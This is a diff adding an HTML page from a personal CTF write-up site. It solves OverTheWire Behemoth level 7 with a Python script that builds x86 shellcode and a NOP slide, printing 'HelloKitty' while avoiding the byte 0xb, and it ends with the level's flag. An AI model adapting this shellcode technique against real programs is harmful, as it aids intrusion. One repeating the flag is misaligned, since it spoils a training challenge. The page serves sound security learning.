@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>behemoth7 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="behemoth7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/behemoth/behemoth07.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/behemoth/behemoth07.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="behemoth7" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"behemoth7","url":"http://localhost:4000/CTF_writeups/overthewire/behemoth/behemoth07.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>In this challenge, we need to write our own shellcode that will print “HelloKitty”.
+notice that you can’t use ‘0xb’ in the shellcode, which is the length of the string “HelloKitty”, thus, i used ‘0xc’ (it will stop after 11 characters because there is null there)</p>
+
+<p>here the shellcode can be found</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>
+
+<span class="c1"># print = lambda *args, **kwargs: None # override print function
+</span>
+
+<span class="c1"># Shellcode in Python
+# write(1, "HelloKitty", 11)
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+
+
+    <span class="c1"># mov	ecx,msg		; message to write
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x69\x74\x74\x79</span><span class="s">"</span>      <span class="c1"># push "itty"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x6c\x6c\x6f\x4b</span><span class="s">"</span>      <span class="c1"># push "lloK"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x0a\x0a\x48\x65</span><span class="s">"</span>      <span class="c1"># push "He"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x83\xc4\x02</span><span class="s">"</span> <span class="c1">#  add esp, 2 
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (now ecx contains: "HelloKitty",\x00)
+</span>
+    <span class="c1"># mov	ebx,1		; file descriptor (stdout)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x5b</span><span class="s">"</span>      <span class="c1"># pop ebx
+</span>
+    <span class="c1"># mov	edx,12		; message length (+1s)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x0c</span><span class="s">"</span>  <span class="c1"># push 11, in this challange i mustn't use '0xb'
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x5a</span><span class="s">"</span>      <span class="c1"># pop edx
+</span>    
+    <span class="c1"># mov	eax,4		; system call number (sys_write)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x04</span><span class="s">"</span>  <span class="c1"># push 4
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_write)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (write(1, "HelloKitty", 11))
+</span>
+    <span class="c1"># mv eax, 1         ; system call number (sys_exit)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
+</span>
+
+
+<span class="p">)</span>
+
+<span class="c1"># Print shellcode details
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"write(1, </span><span class="se">\"</span><span class="s">HelloKitty</span><span class="se">\"</span><span class="s">, 11)"</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode with NOP slide
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
+
+<span class="c1"># Add NOP slide (\x90) before shellcode
+</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
+<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="c1"># Convert to formatted string
+</span><span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Print shellcode in hex format
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Calculate shellcode length
+</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+
+<span class="c1"># sys.stdout.buffer.write(formatted_shellcode)
+</span>
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/behemoth/images/level7.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">sV17oOQTKc</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
